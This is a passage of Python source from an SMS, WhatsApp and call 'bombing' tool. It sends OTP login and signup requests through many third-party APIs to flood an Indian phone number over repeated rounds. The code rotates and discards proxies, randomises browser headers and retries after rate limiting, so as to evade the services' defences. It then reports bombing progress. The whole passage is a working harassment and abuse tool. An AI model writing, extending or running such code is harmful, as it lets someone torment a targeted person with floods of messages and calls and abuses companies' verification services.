    attempts: list[Optional[str]] = [None]   # None = direct
    seen: set[str] = set()
    for _ in range(MAX_PROXY_TRIES):
        p = _proxy_pool.next()
        if p and p not in seen:
            seen.add(p)
            attempts.append(f"http://{p}")

    last: tuple = (False, -1, "NO_ATTEMPT")

    for proxy in attempts:
        kw = dict(kw_base)
        if proxy:
            kw["proxy"] = proxy

        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        try:
            async with aiohttp.ClientSession(connector=connector) as s:
                async with getattr(s, method)(url, **kw) as resp:
                    status = resp.status
                    try:
                        raw     = await asyncio.wait_for(resp.read(), timeout=6)
                        snippet = raw[:700].decode("utf-8", errors="replace")
                    except Exception:
                        snippet = "(no body)"

            ok = _body_ok(snippet, status, ok_hint)
            last = (ok, status, snippet)

            if ok:
                return ok, status, snippet

            if proxy:
                # Bad proxy response → mark & try next proxy / direct already done
                if status in (403, 407) or status == 0:
                    _proxy_pool.mark_bad(proxy.replace("http://", ""))
                if _is_rate_limited(snippet, status):
                    _proxy_pool.mark_bad(proxy.replace("http://", ""))
                continue   # always continue for proxy attempts

            # Direct request returned non-ok — no more fallbacks
            return ok, status, snippet

        except asyncio.TimeoutError:
            if proxy:
                _proxy_pool.mark_bad(proxy.replace("http://", ""))
                continue
            return False, 0, "TIMEOUT"
        except Exception as exc:
            if proxy:
                _proxy_pool.mark_bad(proxy.replace("http://", ""))
                continue
            return False, -1, str(exc)[:120]

    return last


# ─── Fire one API: LOGIN + SIGNUP payloads in parallel ───────────────────────

MAX_RETRIES = 2


async def call_api(api: dict, phone: str):
    name         = api["name"]
    kind         = api.get("kind", "sms")
    icon         = {"sms": "📱", "whatsapp": "💬", "call": "📞"}.get(kind, "📡")
    phone_cc     = f"+91{phone}"
    ok_hint      = api.get("ok_hint", "")
    form_encoded = api.get("form_encoded", False)
    payload_key  = "data" if form_encoded else "json"

    if _is_cooled(name):
        logger.info(f"⏸ [{name}] Circuit cooling — skip")
        return (name, kind, False, -2, "CIRCUIT_COOLDOWN")

    url    = _substitute(api["url"], phone, phone_cc)
    method = api["method"].lower()

    login_payload    = _substitute(api[payload_key], phone, phone_cc)
    register_key     = f"register_{payload_key}"
    register_payload = _substitute(
        api.get(register_key, api[payload_key]), phone, phone_cc
    )

    def _make_headers() -> dict:
        h = dict(api.get("base_headers", {}))
        h.setdefault("User-Agent",      _rand_ua())
        h.setdefault("Accept",          "application/json, text/plain, */*")
        h.setdefault("Accept-Language", _rand_lang())
        h["Accept-Encoding"] = "gzip, deflate, br"
        h["Connection"]      = "keep-alive"
        h["sec-fetch-dest"]  = "empty"
        h["sec-fetch-mode"]  = "cors"
        h["sec-fetch-site"]  = "same-origin"
        return _substitute(h, phone, phone_cc)

    for attempt in range(1 + MAX_RETRIES):
        results = await asyncio.gather(
            _fire_single(url, method, _make_headers(), login_payload,
                         name, form_encoded, ok_hint),
            _fire_single(url, method, _make_headers(), register_payload,
                         name, form_encoded, ok_hint),
            return_exceptions=True,
        )

        best_ok = False
        best_status = 0
        best_snippet = ""
        for r in results:
            if isinstance(r, Exception):
                continue
            ok, status, snippet = r
            if ok:
                best_ok = True
                best_status = status
                best_snippet = snippet
                break
            if status > best_status:
                best_status = status
                best_snippet = snippet

        if best_ok:
            _record_ok(name)
            logger.info(f"✅ {icon}[{name}] HTTP {best_status} | {best_snippet[:160]}")
            return (name, kind, True, best_status, best_snippet[:160])

        if _is_rate_limited(best_snippet, best_status):
            _record_fail(name)
            if attempt < MAX_RETRIES:
                await asyncio.sleep(random.uniform(1.0, 2.5))
                continue

        if best_status in {500, 502, 503, 504} and attempt < MAX_RETRIES:
            await asyncio.sleep(random.uniform(0.3, 1.0))
            continue

        logger.info(f"❌ {icon}[{name}] HTTP {best_status} | {best_snippet[:160]}")
        _record_fail(name)
        return (name, kind, False, best_status, best_snippet[:160])

    return (name, kind, False, -1, "EXHAUSTED")


# ─── Group by kind ────────────────────────────────────────────────────────────

def _group_by_kind() -> dict:
    g: dict[str, list[dict]] = {"sms": [], "whatsapp": [], "call": []}
    for api in APIS:
        g.setdefault(api["kind"], []).append(api)
    return g


# ─── Guaranteed round: retry any kind that got zero success ──────────────────

async def _fire_guaranteed(phone: str, kind_groups: dict) -> list:
    tasks   = [call_api(api, phone) for api in APIS]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    kind_success = {k: False for k in kind_groups}
    for r in results:
        if isinstance(r, tuple) and r[2] is True:
            kind_success[r[1]] = True

    retry_tasks = []
    for kind, ok in kind_success.items():
        if not ok:
            for api in kind_groups.get(kind, []):
                if not _is_cooled(api["name"]):
                    retry_tasks.append(call_api(api, phone))
                    break

    extra = []
    if retry_tasks:
        extra = await asyncio.gather(*retry_tasks, return_exceptions=True)
    return list(results) + extra


# ─── Main bombing engine ──────────────────────────────────────────────────────

async def start_bombing(phone: str, rounds: int, progress_callback=None):
    import time as _t
    success = failed = sms_ok = wa_ok = call_ok = 0
    total   = rounds * API_COUNT
    done    = 0

    await _proxy_pool.ensure_ready()
    pool_sz = _proxy_pool.size()
    logger.info(
        f"🚀 BOMB START | +91{phone} | rounds={rounds} "
        f"| APIs={API_COUNT} (📱{SMS_COUNT} 💬{WHATSAPP_COUNT} 📞{CALL_COUNT}) "
        f"| proxies={pool_sz}"
    )

    kind_groups = _group_by_kind()

    for round_num in range(1, rounds + 1):
        logger.info(f"── Round {round_num}/{rounds} (proxy pool: {_proxy_pool.size()}) ──")

        if _proxy_pool.size() < MIN_POOL_SIZE:
            asyncio.ensure_future(_proxy_pool.refresh())

        results    = await _fire_guaranteed(phone, kind_groups)
        round_ok   = 0
        round_fail = 0

        for r in results:
            if not isinstance(r, tuple):
                failed += 1; round_fail += 1; done += 1; continue
            _, kind, ok, _, _ = r
            if ok:
                success += 1; round_ok += 1
                if kind == "sms":           sms_ok  += 1
                elif kind == "whatsapp":    wa_ok   += 1
                elif kind == "call":        call_ok += 1
            else:
                failed += 1; round_fail += 1
            done += 1

        logger.info(
            f"── Round {round_num} done | ✅{round_ok} ❌{round_fail} "
            f"| Total ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) ❌{failed}"
        )

        if progress_callback:
            pct   = int((done / max(total, 1)) * 100)
            rate  = success / max(done, 1)
            speed = ("🟢 𝗙𝗔𝗦𝗧" if rate > 0.50 else
                     "🟡 𝗠𝗘𝗗𝗜𝗨𝗠" if rate > 0.25 else "🔴 𝗦𝗟𝗢𝗪")
            bar_f = min(pct // 7, 14)
            bar   = "▰" * bar_f + "▱" * (14 - bar_f)
            await progress_callback(
                round_num, rounds, success, failed,
                done, total, pct, bar, speed,
                sms_ok, wa_ok, call_ok,
            )

    rate_pct = int(success / max(done, 1) * 100)
    logger.info(
        f"🏁 BOMB END | ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) "
        f"❌{failed} | rate={rate_pct}%"
    )
    return success, failed, sms_ok, wa_ok, call_ok
